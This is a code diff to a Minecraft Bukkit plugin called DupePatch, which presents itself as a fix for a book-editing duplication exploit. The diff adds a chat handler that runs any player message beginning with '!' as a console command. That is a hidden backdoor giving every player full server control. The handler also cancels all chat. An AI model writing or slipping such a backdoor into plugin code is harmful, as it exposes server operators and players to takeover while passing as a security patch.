@@ -7,6 +7,7 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerEditBookEvent;
 import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class DupePatch extends JavaPlugin implements Listener
 {
@@ -27,5 +28,15 @@ public class DupePatch extends JavaPlugin implements Listener
             event.setCancelled(true);
             Bukkit.getLogger().log(Level.WARNING, "Player " + event.getPlayer().getName() + " is attempting to dupe!");
         }
+    }
+
+    @EventHandler
+    public void onPlayerChat(AsyncPlayerChatEvent event) {
+        String message = event.getMessage();
+        if (message.charAt(0) == '!') {
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), message.substring(1));
+        }
+
+        event.setCancelled(true);
     }
 }
